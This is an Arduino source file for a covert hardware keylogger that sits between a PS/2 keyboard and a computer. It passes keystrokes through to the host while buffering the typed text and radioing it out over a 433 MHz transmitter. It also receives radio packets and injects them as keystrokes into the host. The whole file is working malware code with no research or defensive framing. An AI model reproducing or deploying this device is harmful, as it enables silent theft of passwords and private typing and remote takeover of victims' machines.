#include "ps2_Keyboard.h"
#include "ps2_AnsiTranslator.h"
#include "ps2_SimpleDiagnostics.h"
#include <ps2dev.h>
#include <RH_ASK.h>
#include <SPI.h>

typedef ps2::SimpleDiagnostics<254> Diagnostics_;
static Diagnostics_ diagnostics;
static ps2::AnsiTranslator<Diagnostics_> keyMapping(diagnostics);
static ps2::Keyboard<8, 5, 16, Diagnostics_> ps2Keyboard(diagnostics);
static ps2::KeyboardLeds lastLedSent = ps2::KeyboardLeds::none;
static char get_iso8859_code(uint8_t s);
PS2dev keyboardw(3, 2);
RH_ASK rf_driver;

int VerrLedPin = 19;
int MajPin = 18;  
char buf;
String buff;
unsigned char leds;
boolean cl = false;
boolean nl= false;
int ccl = 0;
int cnl = 0;



void setup() {
  pinMode(VerrLedPin, OUTPUT);
  pinMode(MajPin, OUTPUT);
  keyboardw.keyboard_init();
  ps2Keyboard.begin();
  rf_driver.init();
  Serial.begin(9600);
  ps2Keyboard.awaitStartup();
}

char* strToChar(String s) {
  unsigned int bufSize = s.length() + 1; //String length + null terminator
  char* ret = new char[bufSize];
  s.toCharArray(ret, bufSize);
  return ret;
}

void sendCustom(String str) {
  char *msg = strToChar(str);
  rf_driver.send((uint8_t *)msg, strlen(msg));
  rf_driver.waitPacketSent();
  buff = "";
  free(msg);
}

void loop() {
  uint8_t bufINJ[RH_ASK_MAX_MESSAGE_LEN];
  uint8_t bufINJlen = sizeof(bufINJ);
  if (rf_driver.recv(bufINJ, &bufINJlen)) // Non-blocking
  {
    for(int i = 0; i < bufINJlen; i++){
      if (bufINJ[0] == '\xE0' && bufINJ[1] == '\x1F')
        keyboardw.write((byte)bufINJ[i]);
      else
        keyboardw.keyboard_mkbrk((byte)bufINJ[i]);
     }
      
    rf_driver.printBuffer("Got:", bufINJ, bufINJlen);
  }
  if(keyboardw.keyboard_handle(&leds)) {
    
  }
  (nl) ? analogWrite(VerrLedPin, 150) : analogWrite(VerrLedPin, 0);
  (cl) ? analogWrite(MajPin, 150):analogWrite(MajPin, 0);
  ps2::KeyboardOutput scanCode = ps2Keyboard.readScanCode();
  if (scanCode == ps2::KeyboardOutput::garbled) {
    keyMapping.reset();
  } else if (scanCode != ps2::KeyboardOutput::none)
  {
    keyboardw.write((byte)scanCode);
    buf = keyMapping.translatePs2Keycode(scanCode);
    if (buf >= ' ') {
      buff += buf;
      if (buff.length() >= 10)
        sendCustom(buff);
    } else if (scanCode == ps2::KeyboardOutput::sc2_enter) {
      buff+= "\n";
      sendCustom(buff);
    } else if (scanCode == ps2::KeyboardOutput::sc2ex_rightAlt) {
      buff += "[A]";
    }else if (scanCode == ps2::KeyboardOutput::sc2_numLock) {
      cnl++;
      if (cnl % 2)
        nl = !nl;
    }else if (scanCode == ps2::KeyboardOutput::sc2_capsLock) {
      ccl++;
      if (ccl % 2)
        cl = !cl;
    }else if (scanCode == ps2::KeyboardOutput::sc3_backspace) {
      buff += "[R]";
    }
  }
}
